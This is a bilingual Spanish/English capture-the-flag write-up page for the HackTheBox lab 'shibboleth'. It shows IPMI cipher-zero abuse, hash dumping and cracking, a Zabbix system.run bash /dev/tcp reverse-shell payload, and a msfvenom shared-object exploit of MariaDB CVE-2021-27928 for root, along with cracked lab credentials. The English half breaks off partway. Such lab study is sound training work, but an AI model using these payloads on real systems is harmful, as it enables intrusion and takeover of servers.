@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>shibboleth | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">shibboleth</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+
+            <!-- ========== SPANISH ========== -->
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+
+                    <p>La máquina expone un sitio web que menciona en su footer el uso de <strong>Zabbix</strong> y <strong>Bare Metal BMC automation</strong>. Enumerando virtual hosts se descubren tres subdominios que apuntan al panel de login de Zabbix, pero no hay credenciales válidas por defecto.</p>
+
+                    <p>La pista del BMC lleva directamente al puerto UDP 623 (IPMI/RMCP+). Aprovechando el cifrado nulo (<code>cipher suite 0</code>), se puede autenticar con el usuario <code>Administrator</code> sin contraseña, y desde ahí dumpear el hash IPMI del usuario usando el módulo de Metasploit <code>ipmi_dumphashes</code>. El hash se crackea en segundos con <code>hashcat</code> y las credenciales resultantes dan acceso al panel de Zabbix.</p>
+
+                    <p>Una vez dentro de Zabbix (versión 5.0.17), se abusa de la funcionalidad de items para inyectar un comando a través del parámetro <code>key</code> usando <code>system.run[...]</code>, obteniendo una reverse shell como el usuario <code>zabbix</code>. Probando reutilización de credenciales, el usuario <code>ipmi-svc</code> comparte las mismas credenciales que el panel de Zabbix, lo que permite obtener la flag de usuario.</p>
+
+                    <p>Para la escalada de privilegios, desde la sesión de <code>ipmi-svc</code> se leen las credenciales de la base de datos en <code>/etc/zabbix/zabbix_server.conf</code>. El servidor MariaDB 10.3.25 se ejecuta como <code>root</code> y es vulnerable a <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-27928">CVE-2021-27928</a>. Generando un objeto compartido malicioso con <code>msfvenom</code> y cargándolo mediante <code>SET GLOBAL wsrep_provider</code> desde dentro de la sesión SQL, se consigue una reverse shell directamente como <code>root</code>.</p>
+
+                    <p><strong>Tecnologías/Exploits:</strong> IPMI cipher suite 0 authentication bypass, IPMI hash dumping y cracking (hashcat modo 7300), Zabbix command injection RCE, MariaDB 10.3.25 RCE (CVE-2021-27928).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar los servicios expuestos en la máquina objetivo:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">PORT</span>   <span style="color:#e06c75;">STATE</span>  <span style="color:#e06c75;">SERVICE</span>  <span style="color:#e06c75;">VERSION</span>
+<span style="color:#98c379;">80/tcp</span>  open   http     Apache httpd 2.4.41
+|_http-title: Did not follow redirect to http://shibboleth.htb/
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: Host: shibboleth.htb</code></pre>
+
+                <p>Solo se expone el puerto 80/tcp. Añado <code>shibboleth.htb</code> al <code>/etc/hosts</code> y procedo a enumerar la web.</p>
+
+                <h2>Enumeración Web</h2>
+                <p>Con <code>whatweb</code> obtengo un perfil rápido del servidor:</p>
+
+                <pre><code class="language-plaintext">http://shibboleth.htb/ [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ],
+Email[contact@example.com,info@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)],
+IP[10.129.4.44], Lightbox, PoweredBy[enterprise], Script, Title[FlexStart Bootstrap Template - Index]</code></pre>
+
+                <p>La web tiene un formulario de contacto que hace POST a <code>/forms/contact.php</code>. Al intentar enviarlo, devuelve el siguiente error (con código 200):</p>
+
+                <pre><code class="language-plaintext">Unable to load the "PHP Email Form" Library!</code></pre>
+
+                <p>Esto confirma que el backend usa PHP. El error probablemente se debe a que la librería de formularios de Bootstrap no está configurada correctamente, no es un vector de ataque directo.</p>
+
+                <p>Lo que sí llama la atención es el footer de la página:</p>
+
+                <blockquote>
+                    <p><em>Powered by enterprise monitoring solutions based on <strong>Zabbix</strong> &amp; <strong>Bare Metal BMC automation</strong></em></p>
+                </blockquote>
+
+                <p>Dos pistas muy concretas: Zabbix como plataforma de monitorización y BMC (Baseboard Management Controller) como capa de gestión de hardware. Tomo nota de ambas y continúo.</p>
+
+                <h2>Descubrimiento de Virtual Hosts</h2>
+                <p>Fuzzeando virtual hosts con <code>wfuzz</code> encuentro tres subdominios activos:</p>
+
+                <pre><code class="language-bash">wfuzz -u http://shibboleth.htb \
+  -H <span style="color:#98c379;">"Host: FUZZ.shibboleth.htb"</span> \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  --hw 26</code></pre>
+
+                <pre><code class="language-plaintext"><span style="color:#98c379;">000000099:</span> 200   29 L   219 W   3684 Ch   "monitor"
+<span style="color:#98c379;">000000346:</span> 200   29 L   219 W   3684 Ch   "monitoring"
+<span style="color:#98c379;">000000390:</span> 200   29 L   219 W   3684 Ch   "zabbix"</code></pre>
+
+                <p>Los tres subdominios (<code>monitor</code>, <code>monitoring</code>, <code>zabbix</code>) muestran la misma respuesta y todos apuntan al panel de login de Zabbix. Los añado al <code>/etc/hosts</code>. Pruebo credenciales por defecto y acceso como guest, pero sin éxito. El enlace de ayuda del login apunta a la documentación de la versión 5.0, lo que sugiere que puede ser Zabbix 5.x.</p>
+
+                <p>Sin credenciales válidas, de momento dejo Zabbix aparcado y me centro en la otra pista del footer: el BMC.</p>
+
+                <h2>IPMI — Enumeración por UDP 623</h2>
+                <p>BMC (Baseboard Management Controller) es una interfaz de gestión out-of-band integrada en servidores físicos (iDRAC, iLO, IPMI). Permite a los administradores gestionar el hardware de forma independiente al sistema operativo, incluso cuando este está apagado. La interfaz estándar de IPMI usa el puerto UDP 623 con el protocolo RMCP/RMCP+.</p>
+
+                <p>Compruebo si el puerto está abierto:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">PORT</span>      <span style="color:#e06c75;">STATE</span>  <span style="color:#e06c75;">SERVICE</span>   <span style="color:#e06c75;">VERSION</span>
+<span style="color:#98c379;">623/udp</span>   open   asf-rmcp</code></pre>
+
+                <p>El puerto responde. Para interactuar con IPMI uso <code>ipmitool</code> (instalable con <code>apt</code>). Un primer intento sin especificar cipher suite falla:</p>
+
+                <pre><code class="language-bash">ipmitool -I lanplus -H shibboleth.htb -U admin -P <span style="color:#98c379;">""</span> user list
+<span style="color:#e06c75;">Unable to Get Channel Cipher Suites
+Error: Unable to establish IPMI v2 / RMCP+ session</span></code></pre>
+
+                <p>El cifrado no está negociando bien. La opción <code>-C 0</code> fuerza el uso de la <strong>cipher suite 0</strong> (sin cifrado ni autenticación real), que es un problema conocido de muchas implementaciones IPMI. Si está habilitada, permite autenticarse con cualquier contraseña siempre que el usuario sea válido:</p>
+
+                <pre><code class="language-bash">ipmitool -I lanplus -H shibboleth.htb -U Administrator -P admin -C 0 user list</code></pre>
+
+                <pre><code class="language-plaintext">ID  Name            Callin  Link Auth  IPMI Msg  Channel Priv Limit
+1                   true    false      false     USER
+2   Administrator   true    false      true      USER</code></pre>
+
+                <p>Con el usuario <code>Administrator</code> y cipher suite 0, el acceso funciona independientemente de la contraseña usada. Los demás IDs aparecen vacíos; no son usuarios reales.</p>
+
+                <h3>Escalada de Privilegios IPMI (informativo)</h3>
+                <p>Es posible escalar el privilegio del usuario dentro del contexto IPMI con el siguiente comando, que eleva al usuario 2 al nivel ADMINISTRATOR (nivel 4):</p>
+
+                <pre><code class="language-bash">ipmitool -I lanplus -H shibboleth.htb -U Administrator -P admin -C 0 user priv 2 4</code></pre>
+
+                <pre><code class="language-plaintext">ID  Name            Callin  Link Auth  IPMI Msg  Channel Priv Limit
+1                   true    false      false     USER
+2   Administrator   true    false      true      ADMINISTRATOR</code></pre>
+
+                <p>Sin embargo, la funcionalidad SOL (Serial Over LAN), que permitiría acceso directo al bootloader (GRUB) o a la consola del sistema, está deshabilitada en esta máquina. El valor de esta escalada IPMI es limitado aquí, pero en un entorno real con SOL activo supondría acceso total al sistema de forma independiente al OS.</p>
+
+                <h2>Dumping del Hash IPMI con Metasploit</h2>
+                <p>Una técnica más útil es el dump de hashes IPMI. El proceso consiste en que el cliente inicia una petición de autenticación RAKP y el servidor responde con un mensaje que incluye un HMAC del hash de la contraseña. Este hash puede capturarse y crackearse offline. Metasploit automatiza todo el proceso:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#61afef;">msf</span> &gt; use auxiliary/scanner/ipmi/ipmi_dumphashes
+<span style="color:#61afef;">msf</span> auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; set RHOSTS shibboleth.htb
+RHOSTS =&gt; shibboleth.htb
+<span style="color:#61afef;">msf</span> auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; run
+
+<span style="color:#98c379;">[+]</span> 10.129.4.44:623 - IPMI - Hash found: Administrator:be2acdec820c00004b82c19ab0322d3b946c6ab99a0230a672f368e4434b80d9fd9a42f79973b9c9a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:6e34d666fdb63f31aac82b2e1c0bc140b77f93ab
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed</code></pre>
+
+                <p>También se puede obtener el hash de forma manual capturando el tráfico UDP con Wireshark durante el proceso de autenticación, pero el módulo de Metasploit es la opción más directa.</p>
+
+                <p>Crackeo el hash con <code>hashcat</code> usando el modo 7300 (IPMI2 RAKP HMAC-SHA1):</p>
+
+                <pre><code class="language-bash">hashcat -m 7300 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+                <p>El hash crackea en segundos:</p>
+
+                <pre><code class="language-plaintext">...:6e34d666fdb63f31aac82b2e1c0bc140b77f93ab:<span style="color:#98c379;">ilovepumkinpie1</span>
+
+<span style="color:#e5c07b;">Administrator</span>:<span style="color:#98c379;">ilovepumkinpie1</span></code></pre>
+
+                <h2>Acceso a Zabbix — Inyección de Comandos</h2>
+                <p>Las credenciales <code>Administrator:ilovepumkinpie1</code> dan acceso al panel de Zabbix. Una vez dentro, el footer confirma la versión exacta: <strong>Zabbix 5.0.17</strong>.</p>
+
+                <p>Esta versión es vulnerable a una inyección de comandos a través del parámetro <code>key</code> al crear un item de monitorización. Existe una PoC pública en: <a href="https://github.com/HussienMisbah/Exploits/blob/master/Zabbix_exploit/exploit.py">https://github.com/HussienMisbah/Exploits/blob/master/Zabbix_exploit/exploit.py</a></p>
+
+                <p>Leyendo el código, la técnica es sencilla y replicable directamente desde la interfaz web. El agente Zabbix expone la función <code>system.run[comando]</code>, que ejecuta comandos del sistema en el host monitorizado. Creo un item nuevo en el host con este payload en el campo <code>key</code>:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">system.run</span>[bash -c <span style="color:#98c379;">"bash -i &gt;&amp; /dev/tcp/10.10.14.142/443 0&gt;&amp;1"</span>,nowait]</code></pre>
+
+                <p>Guardo el item. A continuación, lo busco en el listado de items del host y accedo a sus propiedades:</p>
+
+                <img src="./media/image1.png" alt="Panel de propiedades del item en Zabbix mostrando el payload de inyección de comandos en el campo key con la reverse shell configurada" />
+
+                <p>Con un listener de <code>netcat</code> escuchando en el puerto 443, pulso <strong>Execute Now</strong> y en segundos recibo la conexión:</p>
+
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <pre><code class="language-plaintext">listening on [any] 443 ...
+connect to [10.10.14.142] from (UNKNOWN) [10.129.4.44] ...
+id
+<span style="color:#98c379;">uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)</span>
+zabbix@shibboleth:/$</code></pre>
+
+                <p>Tengo shell como el usuario <code>zabbix</code>.</p>
+
+                <h2>Movimiento Lateral — Usuario ipmi-svc</h2>
+                <p>Enumerando el sistema, veo que existe el usuario <code>ipmi-svc</code>. También hay MySQL escuchando localmente en el puerto 3306, pero las credenciales que tengo no funcionan aún para acceder a la base de datos, y el archivo de configuración de Zabbix no es legible desde este usuario.</p>
+
+                <p>Con <code>pspy</code> observo algunos procesos interesantes ejecutándose como root, relacionados con la simulación IPMI que vimos antes:</p>
+
+                <pre><code class="language-plaintext">CMD: UID=0 PID=956 | /usr/bin/ipmi_sim -n -c /etc/ayelow/ipmi_lan.conf -f /etc/ayelow/sim.emu
+CMD: UID=0 PID=953 | /bin/bash /usr/local/bin/ayelow.sh</code></pre>
+
+                <pre><code class="language-bash">cat /usr/local/bin/ayelow.sh</code></pre>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">#!/bin/bash</span>
+/usr/bin/ipmi_sim -n -c /etc/ayelow/ipmi_lan.conf -f /etc/ayelow/sim.emu</code></pre>
+
+                <p>El puerto UDP 623 está simulado en software por <code>ipmi_sim</code> v1.0.13 ejecutándose como root. Esto explica el comportamiento que vimos antes.</p>
+
+                <p>Pruebo reutilización de credenciales con <code>ipmi-svc</code>: las mismas credenciales del panel de Zabbix (<code>ilovepumkinpie1</code>) funcionan para este usuario. Obtengo la flag de usuario al hacer <code>su ipmi-svc</code> o conectarme por SSH.</p>
+
+                <h2>Escalada de Privilegios — MariaDB CVE-2021-27928</h2>
+                <p>Con acceso como <code>ipmi-svc</code>, puedo leer el archivo de configuración de Zabbix y extraer las credenciales de la base de datos:</p>
+
+                <pre><code class="language-bash">cat /etc/zabbix/zabbix_server.conf | grep DB</code></pre>
+
+                <pre><code class="language-plaintext">DBName=zabbix
+DBUser=zabbix
+<span style="color:#98c379;">DBPassword=bloooarskybluh</span></code></pre>
+
+                <p>Me conecto a MySQL y exploro las tablas, pero no encuentro nada de utilidad más allá de los usuarios <code>Admin</code> y <code>guest</code> de Zabbix.</p>
+
+                <p>Lo realmente interesante es la versión del servidor de base de datos y con qué usuario se ejecuta:</p>
+
+                <pre><code class="language-bash">ps -fauxww | grep sql</code></pre>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">root</span>  1116  /bin/sh /usr/bin/mysqld_safe
+<span style="color:#e06c75;">root</span>  1268  \_ /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql
+          --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb19/plugin
+          <span style="color:#98c379;">--user=root</span> --skip-log-error
+          --pid-file=/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock</code></pre>
+
+                <pre><code class="language-plaintext">Server version: <span style="color:#e5c07b;">10.3.25-MariaDB-0ubuntu0.20.04.1</span> Ubuntu 20.04</code></pre>
+
+                <p>MariaDB 10.3.25 ejecutándose como <code>root</code>. Esta versión es vulnerable a <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-15180">CVE-2020-15180</a>, aunque no hay exploits públicos funcionales para ese CVE concreto. Investigando más, encuentro que también está afectada por <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-27928">CVE-2021-27928</a>, que sí tiene exploit público en Exploit-DB: <a href="https://www.exploit-db.com/exploits/49765">https://www.exploit-db.com/exploits/49765</a></p>
+
+                <p>Este CVE afecta a versiones de MariaDB anteriores a la 10.3.3 (según la entrada) y explota el hecho de que la variable global <code>wsrep_provider</code>, que define la ruta a un objeto compartido (.so) del sistema de replicación Galera, puede ser modificada por un usuario con privilegios SQL. Al apuntar esta variable a un archivo <code>.so</code> malicioso, el servidor lo carga y ejecuta su código en el contexto del proceso de MySQL, que en este caso corre como <code>root</code>.</p>
+
+                <h3>Generación del Payload</h3>
+                <p>Desde mi máquina, genero un objeto compartido ELF con <code>msfvenom</code> que contiene una reverse shell:</p>
+
+                <pre><code class="language-bash">msfvenom -p linux/x64/shell_reverse_tcp \
+  LHOST=10.10.14.142 LPORT=443 \
+  -f elf-so -o CVE-2021-27928.so</code></pre>
+
+                <pre><code class="language-plaintext">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf-so file: 476 bytes
+Saved as: CVE-2021-27928.so</code></pre>
+
+                <p>Transfiero el archivo a la máquina víctima mediante un servidor HTTP simple:</p>
+
+                <pre><code class="language-bash"># En mi máquina:
+python3 -m http.server 8080
+
+# En la víctima:
+wget http://10.10.14.142:8080/CVE-2021-27928.so -O /tmp/CVE-2021-27928.so</code></pre>
+
+                <h3>Explotación</h3>
+                <p>Un primer intento usando la flag <code>-e</code> de <code>mysql</code> para ejecutar directamente el payload devuelve una reverse shell, pero como el usuario <code>zabbix</code> (el propietario de la conexión SQL), no como root:</p>
+
+                <pre><code class="language-bash">mysql -u zabbix -p -e <span style="color:#98c379;">'SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";'</span>
+<span style="color:#e06c75;">ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query</span></code></pre>
+
+                <p>La clave está en ejecutar el comando desde <strong>dentro de una sesión SQL interactiva</strong>. El servidor MySQL procesa la carga del <code>.so</code> en el contexto de su propio proceso (que corre como <code>root</code>), no en el del cliente. Al hacerlo con <code>-e</code>, la sesión termina antes de que la shell pueda establecerse correctamente. Desde una sesión interactiva el comportamiento es el esperado:</p>
+
+                <pre><code class="language-bash">mysql -u zabbix -p
+# (introducir contraseña: bloooarskybluh)</code></pre>
+
+                <pre><code class="language-sql">MariaDB [(none)]&gt; <span style="color:#e5c07b;">SET GLOBAL</span> wsrep_provider=<span style="color:#98c379;">"/tmp/CVE-2021-27928.so"</span>;
+<span style="color:#e06c75;">ERROR 2006 (HY000): MySQL server has gone away</span>
+
+No connection. Trying to reconnect...
+Connection id:    15
+Current database: *** NONE ***
+
+<span style="color:#e06c75;">ERROR 2013 (HY000): Lost connection to MySQL server during query</span></code></pre>
+
+                <p>El servidor cae al cargar el objeto compartido (es el comportamiento esperado del exploit). En paralelo, mi listener recibe la conexión:</p>
+
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <pre><code class="language-plaintext">listening on [any] 443 ...
+connect to [10.10.14.142] from (UNKNOWN) [10.129.4.44] 54956
+id
+<span style="color:#98c379;">uid=0(root) gid=0(root) groups=0(root)</span></code></pre>
+
+                <p>Shell como <code>root</code>. Recupero la flag del sistema y la máquina queda comprometida en su totalidad.</p>
+            </div>
+
+            <!-- ========== ENGLISH ========== -->
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+
+                    <p>The machine exposes a website that mentions <strong>Zabbix</strong> and <strong>Bare Metal BMC automation</strong> in its footer. Virtual host enumeration reveals three subdomains pointing to the Zabbix login panel, but default credentials don't work and guest access is disabled.</p>
+
+                    <p>The BMC hint leads directly to UDP port 623 (IPMI/RMCP+). By leveraging <strong>cipher suite 0</strong> (no real encryption or authentication), it's possible to authenticate as <code>Administrator</code> without a valid password and dump the IPMI user hash using Metasploit's <code>ipmi_dumphashes</code> module. The hash cracks in seconds with <code>hashcat</code>, and the resulting credentials grant access to the Zabbix panel.</p>
+
+                    <p>Once logged into Zabbix (version 5.0.17), command injection is achieved by abusing the item creation feature, placing a reverse shell payload in the <code>key</code> field via <code>system.run[...]</code>. A shell is obtained as the <code>zabbix</code> user. Credential reuse testing shows that <code>ipmi-svc</code> shares the same password as the Zabbix panel, yielding the user flag.</p>
+
+                    <p>For privilege escalation, the Zabbix configuration file — now readable as <code>ipmi-svc</code> — reveals MySQL credentials. MariaDB 10.3.25 runs as <code>root</code> and is vulnerable to <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-27928">CVE-2021-27928</a>. By generating a malicious shared object with <code>msfvenom</code> and loading it via <code>SET GLOBAL wsrep_provider</code> from inside an interactive SQL session, a reverse shell is obtained directly as <code>root</code>.</p>
+
+                    <p><strong>Technologies/Exploits:</strong> IPMI cipher suite 0 authentication bypass, IPMI hash dumping and cracking (hashcat mode 7300), Zabbix command injection RCE, MariaDB 10.3.25 RCE (CVE-2021-27928).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services on the target:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">PORT</span>   <span style="color:#e06c75;">STATE</span>  <span style="color:#e06c75;">SERVICE</span>  <span style="color:#e06c75;">VERSION</span>
+<span style="color:#98c379;">80/tcp</span>  open   http     Apache httpd 2.4.41
+|_http-title: Did not follow redirect to http://shibboleth.htb/
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: Host: shibboleth.htb</code></pre>
+
+                <p>Only port 80/tcp is exposed. I add <code>shibboleth.htb</code> to <code>/etc/hosts</code> and proceed to enumerate the web application.</p>
+
+                <h2>Web Enumeration</h2>
+                <p>A quick <code>whatweb</code> fingerprint of the web server:</p>
+
+                <pre><code class="language-plaintext">http://shibboleth.htb/ [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ],
+Email[contact@example.com,info@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)],
+IP[10.129.4.44], Lightbox, PoweredBy[enterprise], Script, Title[FlexStart Bootstrap Template - Index]</code></pre>
+
+                <p>The site has a contact form POSTing to <code>/forms/contact.php</code>. Submitting it returns this error (with a 200 status code):</p>
+
+                <pre><code class="language-plaintext">Unable to load the "PHP Email Form" Library!</code></pre>
+
+                <p>This confirms a PHP backend. The error likely stems from a missing Bootstrap form library dependency rather than an exploitable condition.</p>
+
+                <p>More interesting is the site footer:</p>
+
+                <blockquote>
+                    <p><em>Powered by enterprise monitoring solutions based on <strong>Zabbix</strong> &amp; <strong>Bare Metal BMC automation</strong></em></p>
+                </blockquote>
+
+                <p>Two very specific hints: Zabbix as the monitoring platform and BMC (Baseboard Management Controller) for hardware management. I note both and continue.</p>
+
+                <h2>Virtual Host Discovery</h2>
+                <p>Fuzzing virtual hosts with <code>wfuzz</code> reveals three active subdomains:</p>
+
+                <pre><code class="language-bash">wfuzz -u http://shibboleth.htb \
+  -H <span style="color:#98c379;">"Host: FUZZ.shibboleth.htb"</span> \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  --hw 26</code></pre>
+
+                <pre><code class="language-plaintext"><span style="color:#98c379;">000000099:</span> 200   29 L   219 W   3684 Ch   "monitor"
+<span style="color:#98c379;">000000346:</span> 200   29 L   219 W   3684 Ch   "monitoring"
+<span style="color:#98c379;">000000390:</span> 200   29 L   219 W   3684 Ch   "zabbix"</code></pre>
+
+                <p>All three subdomains (<code>monitor</code>, <code>monitoring</code>, <code>zabbix</code>) serve identical responses pointing to the Zabbix login panel. I add them to <code>/etc/hosts</code>. Default credentials and guest access both fail. The help link from the login page points to the 5.0 documentation, suggesting a Zabbix 5.x installation.</p>
+
+                <p>With no credentials yet, I set Zabbix aside and focus on the other footer hint: BMC.</p>
+
+                <h2>IPMI — UDP Port 623 Enumeration</h2>
+                <p>BMC (Baseboard Management Controller) is an out-of-band management interface built into physical servers (iDRAC, iLO, IPMI). It allows administrators to manage hardware independently of the OS, even when the system is powered off. The standard IPMI interface operates over UDP port 623 using the RMCP/RMCP+ protocol.</p>
+
+                <p>Checking whether the port is open:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">PORT</span>      <span style="color:#e06c75;">STATE</span>  <span style="color:#e06c75;">SERVICE</span>   <span style="color:#e06c75;">VERSION</span>
+<span style="color:#98c379;">623/udp</span>   open   asf-rmcp</code></pre>
+
+                <p>The port responds. I use <code>ipmitool</code> (installable via <code>apt</code>) to interact with it. A first attempt without specifying a cipher suite fails:</p>
+
+                <pre><code class="language-bash">ipmitool -I lanplus -H shibboleth.htb -U admin -P <span style="color:#98c379;">""</span> user list
+<span style="color:#e06c75;">Unable to Get Channel Cipher Suites
+Error: Unable to establish IPMI v2 / RMCP+ session</span></code></pre>
+
+                <p>The <code>-C 0</code> flag forces <strong>cipher suite 0</strong> (no encryption or real authentication), a well-known IPMI misconfiguration. When enabled, it allows authentication with any password as long as the username is valid:</p>
+
+                <pre><code class="language-bash">ipmitool -I lanplus -H shibboleth.htb -U Administrator -P admin -C 0 user list</code></pre>
+
+                <pre><code class="language-plaintext">ID  Name            Callin  Link Auth  IPMI Msg  Channel Priv Limit
+1                   true    false      false     USER
+2   Administrator   true    false      true      USER</code></pre>
+
+                <p>Authentication succeeds with user <code>Administrator</code> and cipher suite 0, regardless of the password used. The remaining IDs are empty — not real users.</p>
+
+                <h3>IPMI Privilege Escalation (informational)</h3>
+                <p>It's possible to escalate the user's privilege level within the IPMI context by setting the privilege of user ID 2 to ADMINISTRATOR (level 4):</p>
+
+                <pre><code class="language-bash">ipmitool -I lanplus -H shibboleth.htb -U Administrator -P admin -C 0 user priv 2 4</code></pre>
+
+                <pre><code class="language-plaintext">ID  Name            Callin  Link Auth  IPMI Msg  Channel Priv Limit
+1                   true    false      false     USER
+2   Administrator   true    false      true      ADMINISTRATOR</code></pre>
+
+                <p>However, SOL (Serial Over LAN) — which would allow direct access to the bootloader (GRUB) or system console — is disabled on this machine. This privilege escalation has limited value here, but in a real-world environment with SOL enabled it would mean full out-of-band system access.</p>
+
+                <h2>IPMI Hash Dumping with Metasploit</h2>
+                <p>A more actionable technique is IPMI hash dumping. During RAKP authentication, the server responds with an HMAC of the user's password hash. This can be captured and cracked offline. Metasploit automates the entire process:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#61afef;">msf</span> &gt; use auxiliary/scanner/ipmi/ipmi_dumphashes
+<span style="color:#61afef;">msf</span> auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; set RHOSTS shibboleth.htb
+RHOSTS =&gt; shibboleth.htb
+<span style="color:#61afef;">msf</span> auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; run
+
+<span style="color:#98c379;">[+]</span> 10.129.4.44:623 - IPMI - Hash found: Administrator:be2acdec820c00004b82c19ab0322d3b946c6ab99a0230a672f368e4434b80d9fd9a42f79973b9c9a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:6e34d666fdb63f31aac82b2e1c0bc140b77f93ab
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed</code></pre>
+
+                <p>The hash can also be obtained manually by capturing UDP traffic with Wireshark during an authentication attempt, but the Metasploit module is the most straightforward approach.</p>
+
+                <p>Cracking the hash with <code>hashcat</code> using mode 7300 (IPMI2 RAKP HMAC-SHA1):</p>
+
+                <pre><code class="language-bash">hashcat -m 7300 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+                <p>It cracks in seconds:</p>
+
+                <pre><code class="language-plaintext">...:6e34d666fdb63f31aac82b2e1c0bc140b77f93ab:<span style="color:#98c379;">ilovepumkinpie1</span>
+
+<span style="color:#e5c07b;">Administrator</span>:<span style="color:#98c379;">ilovepumkinpie1</span></code></pre>
+
+                <h2>Zabbix Access — Command Injection</h2>
+                <p>The credentials <code>Administrator:ilovepumkinpie1</code> grant access to the Zabbix panel. Once logged in, the footer confirms the exact version: <strong>Zabbix 5.0.17</strong>.</p>
+
+                <p>This version is vulnerable to command injection via the item creation feature. A public PoC is available at: <a href="https://github.com/HussienMisbah/Exploits/blob/master/Zabbix_exploit/exploit.py">https://github.com/HussienMisbah/Exploits/blob/master/Zabbix_exploit/exploit.py</a></p>
+
+                <p>Reading through the code, the technique is straightforward and replicable directly from the web interface. The Zabbix agent exposes the <code>system.run[command]</code> function, which executes system commands on the monitored host. I create a new item on the host with the following reverse shell payload in the <code>key</code> field:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">system.run</span>[bash -c <span style="color:#98c379;">"bash -i &gt;&amp; /dev/tcp/10.10.14.142/443 0&gt;&amp;1"</span>,nowait]</code></pre>
+
+                <p>After saving the item, I navigate to the item list for this host and open its properties page:</p>
+
+                <img src="./media/image1.png" alt="Zabbix item properties panel showing the command injection payload in the key field with the reverse shell configured" />
+
+                <p>With a <code>netcat</code> listener on port 443, clicking <strong>Execute Now</strong> triggers the payload:</p>
+
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <pre><code class="language-plaintext">listening on [any] 443 ...
+connect to [10.10.14.142] from (UNKNOWN) [10.129.4.44] ...
+id
+<span style="color:#98c379;">uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)</span>
+zabbix@shibboleth:/$</code></pre>
+
+                <p>Shell access as the <code>zabbix</code> user.</p>
+
+                <h2>Lateral Movement — ipmi-svc User</h2>
+                <p>Enumerating the system, I find a user <code>ipmi-svc</code>. MySQL is also listening locally on port 3306, but the credentials I have don't work yet, and the Zabbix configuration file isn't readable from this user account.</p>
+
+                <p>Running <code>pspy</code>, I spot some interesting root-owned processes related to the IPMI simulation seen earlier:</p>
+
